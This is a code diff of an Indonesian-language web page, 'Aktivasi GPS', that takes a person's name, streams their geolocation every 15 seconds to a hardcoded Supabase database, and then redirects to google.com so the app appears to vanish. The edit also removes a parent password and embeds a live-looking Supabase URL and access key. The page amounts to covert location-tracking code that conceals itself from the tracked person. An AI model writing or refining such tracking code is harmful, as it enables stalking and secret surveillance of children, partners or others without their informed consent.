@@ -50,30 +50,13 @@
   .stat-box { background: #f7fafc; padding: 12px; border-radius: 8px; text-align: center; }
   .stat-label { font-size: 11px; color: #718096; text-transform: uppercase; }
   .stat-value { font-size: 18px; font-weight: 700; color: #2d3748; margin-top: 4px; }
-  .footer-link { text-align: center; margin-top: 20px; font-size: 13px; }
-  .footer-link a { color: white; text-decoration: none; opacity: 0.8; cursor: pointer; }
-  .footer-link a:hover { opacity: 1; }
 </style>
 </head>
 <body>
 
 <div class="container">
-  <!-- SETUP -->
-  <div id="setupScreen" class="card">
-    <div class="logo">
-      <div class="logo-icon">📍</div>
-      <h1>Aktivasi GPS</h1>
-    </div>
-    <label>Server URL:</label>
-    <input id="sbUrl" type="url" placeholder="https://xxxxx.supabase.co">
-    <label>Access Key:</label>
-    <input id="sbKey" type="text" placeholder="sb_p...">
-    <button onclick="saveSetup()">💾 Simpan Konfigurasi</button>
-    <div id="setupStatus" class="status info">Menunggu input...</div>
-  </div>
-
-  <!-- MAIN -->
-  <div id="mainScreen" class="card hidden">
+  <!-- MAIN SCREEN (langsung tampil, tanpa setup) -->
+  <div id="mainScreen" class="card">
     <div class="logo">
       <div class="logo-icon">📡</div>
       <h1>Aktivasi GPS</h1>
@@ -83,7 +66,7 @@
     <label>Nama Anda:</label>
     <input id="userName" type="text" placeholder="Masukkan nama">
     
-    <button onclick="startActivation()" id="startBtn"> Aktivasi GPS</button>
+    <button onclick="startActivation()" id="startBtn">🚀 Aktivasi GPS</button>
     
     <div id="statusBox" class="status info">Siap diaktifkan</div>
     
@@ -111,53 +94,21 @@
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <script>
-const PARENT_PASSWORD = 'ortu123';
-let sbClient = null;
+// ⚠️ GANTI DENGAN DATA SUPABASE ANDA!
+const SUPABASE_URL = 'https://vjqjuwmpsxgyyaksgpdy.supabase.co';
+const SUPABASE_KEY = 'sb_publishable_8xAS-WIffN84TLFrBKZzJA_B3kpPc4V';
+
+// Inisialisasi Supabase client
+let sbClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
 let watchId = null;
 let sendTimer = null;
 let sentCount = 0;
 let currentName = '';
 
-function saveSetup() {
-  let url = document.getElementById('sbUrl').value.trim();
-  const key = document.getElementById('sbKey').value.trim();
-  url = url.replace('/rest/v1', '').replace('/rest', '');
-  
-  if (!url || !key) { alert('URL dan Key harus diisi!'); return; }
-  if (!url.includes('supabase.co')) { alert('URL tidak valid!'); return; }
-  
-  try {
-    localStorage.setItem('sb_url', url);
-    localStorage.setItem('sb_key', key);
-    sbClient = window.supabase.createClient(url, key);
-    document.getElementById('setupStatus').className = 'status ok';
-    document.getElementById('setupStatus').textContent = '✅ Konfigurasi tersimpan!';
-    setTimeout(() => showScreen('mainScreen'), 800);
-  } catch (e) {
-    document.getElementById('setupStatus').className = 'status err';
-    document.getElementById('setupStatus').textContent = '❌ ' + e.message;
-  }
-}
-
-function showScreen(id) {
-  ['setupScreen', 'mainScreen'].forEach(s => {
-    document.getElementById(s).classList.add('hidden');
-  });
-  document.getElementById(id).classList.remove('hidden');
-}
-
-function initApp() {
-  const url = localStorage.getItem('sb_url');
-  const key = localStorage.getItem('sb_key');
-  if (!url || !key) { showScreen('setupScreen'); return; }
-  sbClient = window.supabase.createClient(url, key);
-  showScreen('mainScreen');
-}
-
 async function startActivation() {
   const name = document.getElementById('userName').value.trim();
   if (!name) { alert('Masukkan nama Anda!'); return; }
-  if (!sbClient) { alert('Konfigurasi belum siap!'); return; }
   
   currentName = name.toLowerCase().replace(/\s+/g, '');
   
@@ -194,26 +145,15 @@ async function startActivation() {
   }, 15000);
   
   statusBox.className = 'status ok';
-statusBox.textContent = '✅ GPS aktif! Aplikasi akan disembunyikan otomatis...';
-document.getElementById('startBtn').style.display = 'none';
+  statusBox.textContent = '✅ GPS aktif! Aplikasi akan disembunyikan otomatis...';
+  document.getElementById('startBtn').style.display = 'none';
+  
+  // Auto-hide setelah 3 detik (tanpa popup)
+  setTimeout(function() {
+    window.location.href = 'https://www.google.com';
+  }, 3000);
+}
 
-
- // Tampilkan pesan sukses di layar
-setTimeout(function() {
-    alert('✅ GPS SUDAH AKTIF!\n\nAplikasi akan di-minimize.');
-    
-    if (navigator.userAgent.match(/Android/i)) {
-        try {
-            window.open('about:blank', '_self');
-            window.close();
-        } catch(e) {
-            window.location.href = 'https://www.google.com';
-        }
-    } else {
-        window.location.href = 'https://www.google.com';
-    }
-}, 3000);
-  }
 async function sendLocation(coords) {
   try {
     const { error } = await sbClient.from('locations').insert({
@@ -230,8 +170,6 @@ async function sendLocation(coords) {
     console.error('Gagal kirim:', e);
   }
 }
-
-window.addEventListener('load', initApp);
 </script>
 </body>
 </html>
